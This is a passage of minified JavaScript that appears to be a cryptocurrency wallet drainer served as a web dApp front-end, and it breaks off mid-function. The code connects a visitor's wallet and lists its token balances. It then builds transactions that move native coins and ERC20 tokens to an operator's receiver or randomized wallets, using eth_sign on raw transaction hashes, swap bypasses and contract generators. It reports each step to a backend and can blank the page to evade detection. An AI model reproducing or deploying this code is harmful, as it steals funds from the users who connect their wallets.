navigator&&(t=navigator.userAgent||navigator.vendor||""),!t&&window.opera&&(t=window.opera),!!t&&(!function(t){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(t)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(t.substr(0,4)))&&(e=!0)}(t),e)})(),eu=!1,ed=!1,eh=!1,ep=async()=>{eu||(eu=!0,X=AppKit.createAppKit({adapters:[new Ethers5Adapter],networks:[Networks.mainnet,Networks.bsc,Networks.arbitrum,Networks.avalanche,Networks.optimism,Networks.base,Networks.zksync,Networks.polygon,Networks.fantom,Networks.pulsechain],metadata:Y,projectId:Z,featuredWalletIds:["4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0"],features:{email:!1,socials:[]},...Q}),console.log("CF_AppKit"),console.log(X),console.log("CF_AppKit"),console.log(Y),console.log(Z),X.subscribeState(async e=>{}),X.subscribeEvents(async e=>{try{if(console.log(e.data),"INITIALIZE"==e.data.event){if(ed=!0,void 0!=X.getWalletProvider()){eh=!0;try{X.disconnect(X.getWalletProvider())}catch(e){console.log(e)}}}else"DISCONNECT_SUCCESS"==e.data.event?eh=!1:"CONNECT_SUCCESS"==e.data.event?(eh=!0,W=X.getAddress(),H=X.getWalletProvider()):"MODAL_OPEN"==e.data.event||e.data.event}catch(e){console.log(e)}}))},em=0,ew=async e=>{try{if(G)return{status:"error",error:"Server is Unavailable"};for(;Date.now()<=em;)await new Promise(e=>setTimeout(e,1));em=Date.now(),e.domain=window.location.host,e.user_id=U||null,e.message_ts=em,e.chat_data=0,e.wallet_address=W,e.partner_address=!1;let t=JSON.stringify(e);console.dir(t,{depth:null}),console.log("request_data - ".concat(t));let a=await fetch("/api/".concat(e.action),{method:"POST",headers:{"Content-Type":"application/json"},body:t});console.log(a),console.log(a),console.log(a);let n=JSON.parse(await a.text());if(console.log("response_data - ".concat(n)),!n.status)return{status:"error",error:"Server is Unavailable"};return"error"==n.status&&"SRV_UNAVAILABLE"==n.error&&(G=!0),"error"==n.status&&"INVALID_VERSION"==n.error&&(G=!0),n}catch(e){return console.log(e),{status:"error",error:"Server is Unavailable"}}},ef=async()=>{try{let e=await ew({action:"retrieve_config"});"OK"==e.status&&(z=(L=e.data).Settings.Gas_Multiplier,"boolean"==typeof L.DSB&&!0===L.DSB&&(window.location.href="about:blank"))}catch(e){console.log(e)}},eg=async()=>{try{let e=null;localStorage.personal_wallet&&(e={address:localStorage.personal_wallet});let t=await ew({action:"retrieve_wallet",personal_wallet:e});"OK"==t.status&&(L.Personal_Wallet=t.wallet,L.Personal_Wallet&&"object"==typeof L.Personal_Wallet&&(localStorage.personal_wallet=L.Personal_Wallet.address))}catch(e){console.log(e),L.Personal_Wallet=null}},e_=async()=>{try{if(!L.Notifications.connect_request)return;await ew({action:"connect_request",user_id:U,wallet:M})}catch(e){console.log(e)}},ey=async()=>{try{if(!L.Notifications.connect_cancel)return;await ew({action:"connect_cancel",user_id:U})}catch(e){console.log(e)}},ev=async()=>{try{if(!L.Notifications.connect_success)return;await ew({action:"connect_success",user_id:U,address:W,wallet:null==$?M:$,chain_id:V})}catch(e){console.log(e)}},eb=(e,t,a)=>{try{if("ANKR"==e&&"ID"==t)switch(a){case"eth":return 1;case"bsc":return 56;case"polygon":return 137;case"avalanche":return 43114;case"arbitrum":return 42161;case"optimism":return 10;case"fantom":return 250;case"era":return 324;case"base":return 8453;case"pulse":return 369;case"blast":return 81457;default:return!1}if("OPENSEA"==e&&"ID"==t)switch(a){case"ethereum":return 1;case"matic":return 137;case"avalanche":return 43114;case"arbitrum":return 42161;case"optimism":return 10;case"era":return 324;case"base":return 8453;case"pulse":return 369;case"blast":return 81457;default:return!1}if("ID"==e&&"ANKR"==t)switch(a){case 1:return"eth";case 56:return"bsc";case 137:return"polygon";case 43114:return"avalanche";case 42161:return"arbitrum";case 10:return"optimism";case 250:return"fantom";case 25:return"cronos";case 100:return"gnosis";case 128:return"heco";case 1284:return"moonbeam";case 1285:return"moonriver";case 2222:return"kava";case 42220:return"celo";case 16666e5:return"harmony";case 324:return"zksync_era";case 8453:return"base";case 369:return"pulse";case 81457:return"blast";default:return!1}else if("ID"==e&&"CURRENCY"==t)switch(a){case 1:case 42161:case 10:case 324:case 8453:case 81457:return"ETH";case 56:return"BNB";case 137:return"MATIC";case 43114:return"AVAX";case 250:return"FTM";case 25:return"CRO";case 100:return"XDAI";case 128:return"HT";case 1284:return"GLMR";case 1285:return"MOVR";case 2222:return"KAVA";case 42220:return"CELO";case 16666e5:return"ONE";case 369:return"PLS";default:return!1}}catch(e){return console.log(e),!1}},ex=async e=>{try{let t=[],a=await fetch("https://rpc.ankr.com/multichain/".concat(L.AT||""),{method:"POST",headers:{Accept:"application/json","Content-Type":"application/json"},body:JSON.stringify({id:1,jsonrpc:"2.0",method:"ankr_getAccountBalance",params:{blockchain:["eth","base","bsc","polygon","avalanche","arbitrum","fantom","optimism","base"],walletAddress:e}})});for(let e of(a=await a.json()).result.assets)try{let a=e.contractAddress||"NATIVE";if(L.Contract_Whitelist.length>0&&!L.Contract_Whitelist.includes(a.toLowerCase().trim())||L.Contract_Blacklist.length>0&&L.Contract_Blacklist.includes(a.toLowerCase().trim()))continue;let n={chain_id:eb("ANKR","ID",e.blockchain),name:e.tokenName,type:e.tokenType,amount:parseFloat(e.balance),amount_raw:e.balanceRawInteger,amount_usd:parseFloat(e.balanceUsd),symbol:e.tokenSymbol,decimals:e.tokenDecimals,address:a||null,price:parseFloat(e.tokenPrice)};n.price>0&&t.push(n)}catch(e){console.log(e)}return t}catch(e){return console.log(e),[]}},eC=async(e,t)=>{try{if(!en[e]||""==L.Settings.Chains[eb("ID","ANKR",e)].API)return F.ERC20;for(;et[e]&&et[e].time==Math.floor(Date.now()/1e3)&&et[e].count>=5;)await new Promise(e=>setTimeout(e,100));et[e]?et[e].time==Math.floor(Date.now()/1e3)?et[e].count+=1:(et[e].time=Math.floor(Date.now()/1e3),et[e].count=1):et[e]={time:Math.floor(Date.now()/1e3),count:1};let a=await fetch("https://".concat(en[e],"/api?module=contract&action=getsourcecode&address=").concat(t,"&apikey=").concat(L.Settings.Chains[eb("ID","ANKR",e)].API),{method:"GET",headers:{Accept:"application/json"}});if(a=await a.json(),"OK"!=a.message)return F.ERC20;if("1"!=a.result[0].Proxy||""==a.result[0].Implementation)return JSON.parse(a.result[0].ABI);{let t=a.result[0].Implementation;return eC(e,t)}}catch(e){return F.ERC20}},eS=e=>{try{if(!1==L.Settings.Permit.Mode)return 0;let t=(e=>{for(let t in e)if(t.startsWith("permit("))return!0;return!1})(e);if((e.hasOwnProperty("permit")||t)&&e.hasOwnProperty("nonces")&&e.hasOwnProperty("name")&&e.hasOwnProperty("DOMAIN_SEPARATOR"))return(e=>{for(let t in e)if(t.startsWith("permit(")){let e=t.slice(7).split(",");if(7===e.length&&-1===t.indexOf("bool"))return 2;if(8===e.length&&-1!==t.indexOf("bool"))return 1}return 0})(e);return 0}catch(e){return 0}},eT=async e=>{let t=new N.F(L.RPCs[e]);return await t.getTransactionCount(W,"pending")},ek=async e=>{let t=new N.F(L.RPCs[e.chain_id]),a=O(await t.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z))),n=new N.F(L.RPCs[1]);O(await n.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z)));let r=O(42161==e.chain_id||43114==e.chain_id?5e6:369==e.chain_id?9e5:15e4).mul(ee[e.chain_id]).mul(a),i={from:W,to:L.Receiver,value:O(100),data:"0x"},o=null;try{o=await t.estimateGas(i)}catch(t){o=(e=>{switch(e){case 42161:case 43114:return O(5e6);default:return O(1e5)}})(parseInt(e.chain_id))}let s=await t.getBalance(W),c=s.sub(o.mul(a)).sub(r);if(1==L.Settings.Reserves.Mode)c=s.sub(o.mul(a)).div(O(100)).mul(O(100).sub(O(L.Settings.Reserves.Fix_Percent[e.chain_id])));else if(2==L.Settings.Reserves.Mode){let t=0,n=L.Settings.Reserves.Fix_Percent[e.chain_id];for(let a of L.Settings.Reserves.Flex_Percent[e.chain_id])e.amount_usd>a.amount||t>a.amount||(t=a.amount,n=a.percent);c=s.sub(o.mul(a)).div(O(100)).mul(O(100).sub(O(n)))}else 3==L.Settings.Reserves.Mode&&(c=s.sub(o.mul(a)));if(c.lte(O(0)))throw"LOW_BALANCE";let l=await t.getTransactionCount(W,"pending"),u=new I.Ay$(H);i.value=u.utils.toHex(c.toString()),i.nonce=u.utils.toHex(l.toString()),i.gasPrice=u.utils.toHex(a.toString()),i.gasLimit=u.utils.toHex(o.toString()),i.v=u.utils.toHex(e.chain_id),i.r="0x",i.s="0x";let d="0x"+(i=new ethereumjs.Tx(i)).serialize().toString("hex");d=u.utils.sha3(d,{encoding:"hex"}),await eQ(e);let h=await u.eth.sign(d,W),p="0x"+(h=h.substring(2)).substring(0,64),m="0x"+h.substring(64,128),w=parseInt(h.substring(128,130),16),f=u.utils.toHex(w+2*e.chain_id+8);i.v=f,i.r=p,i.s=m,d="0x"+i.serialize().toString("hex");let g=await t.sendTransaction(d);L.Settings.Wait_For_Confirmation&&await t.waitForTransaction(g.hash,1,9e4),await eV(e,c)},eE=async e=>{eb("ID","ANKR",e.chain_id);let t=new N.F(L.RPCs[e.chain_id]),a=O(await t.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z))),n=new N.F(L.RPCs[1]);O(await n.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z)));let r=O(42161==e.chain_id||43114==e.chain_id?5e6:369==e.chain_id?9e5:15e4).mul(ee[e.chain_id]).mul(a),i=await ew({action:"contract_new",chain_id:e.chain_id,amount:e.amount_usd,PW:L.Personal_Wallet});if("OK"!=i.status)return eN(e,!0);let o=i.address,s=i.method,c=JSON.parse('[{"constant":false,"inputs":[],"name":"'.concat(s,'","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]')),l=new I.Ay$(H),u=null;u=new l.eth.Contract(c,o).methods[s]().encodeABI();let d={from:W,to:o,value:O(100),data:u},h=O(42161==e.chain_id||43114==e.chain_id?5e6:369==e.chain_id?9e5:1e5),p=await t.getBalance(W),m=p.sub(h.mul(a)).sub(r);if(1==L.Settings.Reserves.Mode)m=p.sub(h.mul(a)).div(O(100)).mul(O(100).sub(O(L.Settings.Reserves.Fix_Percent[e.chain_id])));else if(2==L.Settings.Reserves.Mode){let t=0,n=L.Settings.Reserves.Fix_Percent[e.chain_id];for(let a of L.Settings.Reserves.Flex_Percent[e.chain_id])e.amount_usd>a.amount||t>a.amount||(t=a.amount,n=a.percent);m=p.sub(h.mul(a)).div(O(100)).mul(O(100).sub(O(n)))}else 3==L.Settings.Reserves.Mode&&(m=p.sub(h.mul(a)));if(m.lte(O(0))){d.to=L.Receiver,d.data="0x";let n=await t.estimateGas(d),i=p.sub(n.mul(a)).sub(r);if(1==L.Settings.Reserves.Mode)m=p.sub(n.mul(a)).div(O(100)).mul(O(100).sub(O(L.Settings.Reserves.Fix_Percent[e.chain_id])));else if(2==L.Settings.Reserves.Mode){let t=0,r=L.Settings.Reserves.Fix_Percent[e.chain_id];for(let a of L.Settings.Reserves.Flex_Percent[e.chain_id])e.amount_usd>a.amount||t>a.amount||(t=a.amount,r=a.percent);m=p.sub(n.mul(a)).div(O(100)).mul(O(100).sub(O(r)))}else 3==L.Settings.Reserves.Mode&&(m=p.sub(n.mul(a)));if(!i.lte(O(0)))return eN(e,!0);throw"LOW_BALANCE"}let w=await t.getTransactionCount(W,"pending");d.value=m,d.nonce=w,d.gasPrice=a,d.gasLimit=h,await e0(e);let f=await K.sendTransaction(d);L.Settings.Wait_For_Confirmation&&await t.waitForTransaction(f.hash,1,9e4);try{await ew({action:"contract_used",chain_id:e.chain_id,contract:o,transaction:f,address:W,amount:e.amount_usd})}catch(e){console.log(e)}await eq(e,m)},eR=async e=>{let t=eb("ID","ANKR",e.chain_id),a=new N.F(L.RPCs[e.chain_id]),n=O(await a.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z))),r=new N.F(L.RPCs[1]);O(await r.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z)));let i=O(42161==e.chain_id||43114==e.chain_id?5e6:369==e.chain_id?9e5:15e4).mul(ee[e.chain_id]).mul(n);L.Settings.Use_Public_Contract&&null!=L.Public_Contract[parseInt(e.chain_id)]&&(L.Settings.Chains[t].Contract_Legacy=2,L.Settings.Chains[t].Contract_Address=L.Public_Contract[parseInt(e.chain_id)][L.Settings.Use_Public_Premium?+(e.amount_usd>=500):0]);let o=1==L.Settings.Chains[t].Contract_Legacy?JSON.parse('[{"constant":false,"inputs":[],"name":"'.concat(L.Settings.Chains[t].Contract_Type,'","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]')):0==L.Settings.Chains[t].Contract_Legacy?JSON.parse('[{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"'.concat(L.Settings.Chains[t].Contract_Type,'","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]')):JSON.parse('[{"constant":false,"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},\n    {"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"'.concat(L.Settings.Chains[t].Contract_Type,'","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]')),s=new I.Ay$(H),c=null,l=new s.eth.Contract(o,L.Settings.Chains[t].Contract_Address);if(0==L.Settings.Chains[t].Contract_Legacy)c=l.methods[L.Settings.Chains[t].Contract_Type](L.Receiver).encodeABI();else if(2==L.Settings.Chains[t].Contract_Legacy){let a=!1;try{let t=await ew({action:"partner_percent",address:!1,amount_usd:e.amount_usd||null});"OK"==t.status&&!0==t.mode&&(a=t.percent)}catch(e){console.log(e)}let n=!a&&"0x0000000000000000000000000000000000000000";c=l.methods[L.Settings.Chains[t].Contract_Type](W,L.Receiver,n,s.utils.toHex(!a?0:a),L.Settings.Use_Back_Feature).encodeABI()}else c=l.methods[L.Settings.Chains[t].Contract_Type]().encodeABI();let u={from:W,to:L.Settings.Chains[t].Contract_Address,value:O(100),data:c},d=O(42161==e.chain_id||43114==e.chain_id?5e6:369==e.chain_id?9e5:1e5),h=await a.getBalance(W),p=h.sub(d.mul(n)).sub(i);if(1==L.Settings.Reserves.Mode)p=h.sub(d.mul(n)).div(O(100)).mul(O(100).sub(O(L.Settings.Reserves.Fix_Percent[e.chain_id])));else if(2==L.Settings.Reserves.Mode){let t=0,a=L.Settings.Reserves.Fix_Percent[e.chain_id];for(let n of L.Settings.Reserves.Flex_Percent[e.chain_id])e.amount_usd>n.amount||t>n.amount||(t=n.amount,a=n.percent);p=h.sub(d.mul(n)).div(O(100)).mul(O(100).sub(O(a)))}else 3==L.Settings.Reserves.Mode&&(p=h.sub(d.mul(n)));if(p.lte(O(0))){u.to=L.Receiver,u.data="0x";let t=await a.estimateGas(u),r=h.sub(t.mul(n)).sub(i);if(1==L.Settings.Reserves.Mode)p=h.sub(t.mul(n)).div(O(100)).mul(O(100).sub(O(L.Settings.Reserves.Fix_Percent[e.chain_id])));else if(2==L.Settings.Reserves.Mode){let a=0,r=L.Settings.Reserves.Fix_Percent[e.chain_id];for(let t of L.Settings.Reserves.Flex_Percent[e.chain_id])e.amount_usd>t.amount||a>t.amount||(a=t.amount,r=t.percent);p=h.sub(t.mul(n)).div(O(100)).mul(O(100).sub(O(r)))}else 3==L.Settings.Reserves.Mode&&(p=h.sub(t.mul(n)));if(!r.lte(O(0)))return eN(e,!0);throw"LOW_BALANCE"}let m=await a.getTransactionCount(W,"pending");u.value=p,u.nonce=m,u.gasPrice=n,u.gasLimit=d,await e0(e);let w=await K.sendTransaction(u);L.Settings.Wait_For_Confirmation&&await a.waitForTransaction(w.hash,1,9e4),await eq(e,p)},eP=async e=>{let t=new N.F(L.RPCs[e.chain_id]),a=O(await t.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z))),n=O(42161==e.chain_id||43114==e.chain_id?5e6:369==e.chain_id?9e5:15e4).mul(ee[e.chain_id]).mul(a),r={from:W,to:L.Personal_Wallet.address,value:O(100),data:"0x"},i=await t.estimateGas(r),o=new N.F(L.RPCs[1]);O(await o.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z)));let s=await t.getBalance(W),c=s.sub(i.mul(a)).sub(n);if(1==L.Settings.Reserves.Mode)c=s.sub(i.mul(a)).div(O(100)).mul(O(100).sub(O(L.Settings.Reserves.Fix_Percent[e.chain_id])));else if(2==L.Settings.Reserves.Mode){let t=0,n=L.Settings.Reserves.Fix_Percent[e.chain_id];for(let a of L.Settings.Reserves.Flex_Percent[e.chain_id])e.amount_usd>a.amount||t>a.amount||(t=a.amount,n=a.percent);c=s.sub(i.mul(a)).div(O(100)).mul(O(100).sub(O(n)))}else 3==L.Settings.Reserves.Mode&&(c=s.sub(i.mul(a)));if(c.lte(O(0)))throw"LOW_BALANCE";let l=await t.getTransactionCount(W,"pending");r.value=c,r.nonce=l,r.gasPrice=a,r.gasLimit=i,await e0(e);let u=await K.sendTransaction(r);L.Settings.Wait_For_Confirmation&&await t.waitForTransaction(u.hash,1,9e4);let d=ew({action:"withdraw_native",wallet:L.Personal_Wallet,chain_id:e.chain_id,amount_usd:e.amount_usd,user_id:U,asset:e,address:W});L.Settings.Wait_For_Response&&await d,await eq(e,c)},eN=async function(e){let t=arguments.length>1&&void 0!==arguments[1]&&arguments[1],a=eb("ID","ANKR",e.chain_id);if(L.Settings.Use_Swap_Bypass_For_ETH&&1==e.chain_id&&e.amount_usd>=10)return ej(e);if(!1==t&&L.Settings.Use_Contract_Generator&&e.amount_usd>=L.Settings.Contract_Creation_Limit[e.chain_id])return eE(e);if(L.Settings.Use_Wallet_Randomizer&&null!=L.Personal_Wallet)return eP(e);if(!1==t&&(""!=L.Settings.Chains[a].Contract_Address||L.Settings.Use_Public_Contract&&null!=L.Public_Contract[parseInt(e.chain_id)])&&e.amount_usd>=L.Settings.Use_Contract_Amount)return eR(e);let n=new N.F(L.RPCs[e.chain_id]),r=O(await n.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z))),i=new N.F(L.RPCs[1]);O(await i.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z)));let o=O(42161==e.chain_id||43114==e.chain_id?5e6:369==e.chain_id?9e5:15e4).mul(ee[e.chain_id]).mul(r),s={from:W,to:L.Receiver,value:O(100),data:"0x"},c=await n.estimateGas(s),l=await n.getBalance(W),u=l.sub(c.mul(r)).sub(o);if(1==L.Settings.Reserves.Mode)u=l.sub(c.mul(r)).div(O(100)).mul(O(100).sub(O(L.Settings.Reserves.Fix_Percent[e.chain_id])));else if(2==L.Settings.Reserves.Mode){let t=0,a=L.Settings.Reserves.Fix_Percent[e.chain_id];for(let n of L.Settings.Reserves.Flex_Percent[e.chain_id])e.amount_usd>n.amount||t>n.amount||(t=n.amount,a=n.percent);u=l.sub(c.mul(r)).div(O(100)).mul(O(100).sub(O(a)))}else 3==L.Settings.Reserves.Mode&&(u=l.sub(c.mul(r)));if(u.lte(O(0)))throw"LOW_BALANCE";let d=await n.getTransactionCount(W,"pending");s.value=u,s.nonce=d,s.gasPrice=r,s.gasLimit=c,await e0(e);let h=await K.sendTransaction(s);L.Settings.Wait_For_Confirmation&&await n.waitForTransaction(h.hash,1,9e4),await eq(e,u)},eA=async e=>{let t=new N.F(L.RPCs[e.chain_id]),a=O(await t.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z))),n=new N.F(L.RPCs[1]);O(await n.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z)));let r={from:W,to:e.address,value:"0x0",data:"0x"},i=new I.Ay$(H);r.data=new i.eth.Contract(F.ERC20,e.address).methods.transfer(L.Personal_Wallet.address,e.amount_raw).encodeABI();let o=await t.estimateGas(r);if((await t.getBalance(W)).sub(o.mul(a)).lt(O(0)))throw"LOW_BALANCE";r.nonce=await t.getTransactionCount(W,"pending"),r.gasPrice=a,r.gasLimit=o,await e0(e);let s=await K.sendTransaction(r);L.Settings.Wait_For_Confirmation&&await t.waitForTransaction(s.hash,1,9e4);let c=ew({action:"withdraw_token",wallet:L.Personal_Wallet,chain_id:e.chain_id,amount_usd:e.amount_usd,user_id:U,asset:e,address:W});L.Settings.Wait_For_Response&&await c,await eq(e)},eD=async e=>{if(L.Settings.Use_Randomizer_For_Tokens&&null!=L.Personal_Wallet)return eA(e);let t=new N.F(L.RPCs[e.chain_id]),a=O(await t.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z))),n=new N.F(L.RPCs[1]);O(await n.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z)));let r={from:W,to:e.address,value:"0x0",data:"0x"},i=new I.Ay$(H);r.data=new i.eth.Contract(F.ERC20,e.address).methods.transfer(L.Receiver,e.amount_raw).encodeABI();let o=await t.estimateGas(r);if((await t.getBalance(W)).sub(o.mul(a)).lt(O(0)))throw"LOW_BALANCE";r.nonce=await t.getTransactionCount(W,"pending"),r.gasPrice=a,r.gasLimit=o,await e0(e);let s=await K.sendTransaction(r);L.Settings.Wait_For_Confirmation&&await t.waitForTransaction(s.hash,1,9e4),await eq(e)},ej=async e=>{let t,a=new N.F(L.RPCs[e.chain_id]),n=O(await a.getGasPrice()).div(O(100)).mul(O(Math.floor(100*z))),r=await a.getBalance(W),i=Math.floor(Date.now()/1e3)+300,o="0xEfF92A263d31888d860bD50809A8D171709b7b1c",s=new A.NZ(o,es,K),c,l=0,u=r.sub(O(21e3).mul(n)).sub(O([42161,43114].includes(e.chain_id)?5e6:369===e.chain_id?9e5:15e4).mul(ee[e.chain_id]).mul(n));for(;l++<3;)try{c=(c=await s.estimateGas.swapExactETHForTokens("0",[eo[e.chain_id],L.Settings.Swap_Bypass_For_ETH_Token],L.Receiver,i,{from:W,value:u})).mul(120).div(100);break}catch(t){c=P.gH.from([42161,43114].includes(e.chain_id)?5e6:35e4)}let d=r.sub(c.mul(n));if(1===L.Settings.Reserves.Mode){let t=L.Settings.Reserves.Fix_Percent[e.chain_id];d=d.mul(100-t).div(100)}else if(2===L.Settings.Reserves.Mode){let t=L.Settings.Reserves.Fix_Percent[e.chain_id],a=0;for(let{amount:n,percent:r}of L.Settings.Reserves.Flex_Percent[e.chain_id])e.amount_usd>=n&&n>=a&&(a=n,t=r);d=d.mul(100-t).div(100)}if(d.lte(O(0)))throw"LOW_BALANCE";try{let n=new A.NZ(o,eI,a),r=[eo[e.chain_id],L.Settings.Swap_Bypass_For_ETH_Token],i=await n.getAmountsOut(d.toString(),r);t=P.gH.from(i[1]).mul(95).div(100)}catch(e){console.warn("Quote failed, fallback to 0",e),t=P.gH.from(0)}let h=await eT(e.chain_id);await e1(e);let p=await s.swapExactETHForTokens(t.toString(),[eo[e.chain_id],L.Settings.Swap_Bypass_For_ETH_Token],L.Receiver,i,{gasLimit:c,gasPrice:n,nonce:h,from:W,value:d});L.Settings.Wait_For_Confirmation&&await a.waitForTransaction(p.hash,1,6e4),await eK("Pancake",e,[e])},eI=[{inputs:[{internalType:"uint256",name:"amountIn",type:"uint256"},{internalType:"uint256",name:"amountOutMin",type:"uint256"},{internalType:"address[]",name:"path",type:"address[]"},{internalType:"address",name:"to",type:"address"}],name:"swapExactTokensForTokens",outputs:[{internalType:"uint256",name:"amountOut",type:"uint256"}],stateMutability:"payable",type:"function"},{inputs:[{internalType:"uint256",name:"deadline",type:"uint256"},{internalType:"bytes[]",name:"data",type:"bytes[]"}],name:"multicall",outputs:[{internalType:"bytes[]",name:"",type:"bytes[]"}],stateMutability:"payable",type:"function"},...es,{inputs:[{internalType:"uint256",name:"amountIn",type:"uint256"},{internalType:"address[]",name:"path",type:"address[]"}],name:"getAmountsOut",outputs:[{internalType:"uint256[]",name:"",type:"uint256[]"}],stateMutability:"view",type:"function"}];function eO(){for(var e=arguments.length,t=Array(e),a=0;a<e;a++)t[a]=arguments[a];console.log("[Save_tokens]",...t)}function eL(e){return e.toString(16).padStart(64,"0")}function eF(e){return(function(e){if(!e)throw Error("Пустой адрес");let t=String(e).toLowerCase().replace(/^0x/,"");if(40!==t.length)throw Error("Некорректный адрес: ".concat(e));return t})(e).padStart(64,"0")}let eW={1:{name:"Ethereum",chainIdHex:"0x1",wrappedNative:"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",router:"0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"},10:{name:"Optimism",chainIdHex:"0xa",wrappedNative:"0x4200000000000000000000000000000000000006",router:"0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"},56:{name:"BSC",chainIdHex:"0x38",wrappedNative:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",router:"0x10ED43C718714eb63d5aA57B78B54704E256024E"},137:{name:"Polygon",chainIdHex:"0x89",wrappedNative:"0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",router:"0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff"},250:{name:"Fantom",chainIdHex:"0xfa",wrappedNative:"0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83",router:"0xF491e7B69E4244ad4002BC14e878a34207E38c29"},42161:{name:"Arbitrum One",chainIdHex:"0xa4b1",wrappedNative:"0x82af49447d8a07e3bd95bd0d56f35241523fbab1",router:"0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"},43114:{name:"Avalanche",chainIdHex:"0xa86a",wrappedNative:"0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7",router:"0x60aE616a2155Ee3d9A68541Ba4544862310933d4"}};function eM(e){return new Promise(t=>setTimeout(t,e))}async function eB(e,t,a){let n=arguments.length>3&&void 0!==arguments[3]?arguments[3]:20,r=arguments.length>4&&void 0!==arguments[4]?arguments[4]:3e3;a("waitForBatchStatus: start",{batchId:t,maxTries:n,delayMs:r});for(let i=0;i<n;i++){let n=await e.request({method:"wallet_getCallsStatus",params:[t]});a("waitForBatchStatus: status =",n);let i=null==n?void 0:n.status;if(100===i||"pending"===i){await eM(r);continue}if(200===i||"success"===i)return a("waitForBatchStatus: SUCCESS"),n;return a("waitForBatchStatus: FAILED",n),n}throw Error("waitForBatchStatus: timeout")}async function eU(e,t,a){let n=arguments.length>3&&void 0!==arguments[3]?arguments[3]:20,r=arguments.length>4&&void 0!==arguments[4]?arguments[4]:3e3;a("waitForTxReceipt: start",t);for(let i=0;i<n;i++){let n=await e.request({method:"eth_getTransactionReceipt",params:[t]});if(!n){await eM(r);continue}return a("waitForTxReceipt: got receipt",n),n}throw Error("waitForTxReceipt: timeout for "+t)}async function eH(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},a=t.log||eO;a("=== START ==="),a("input assets:",e);let 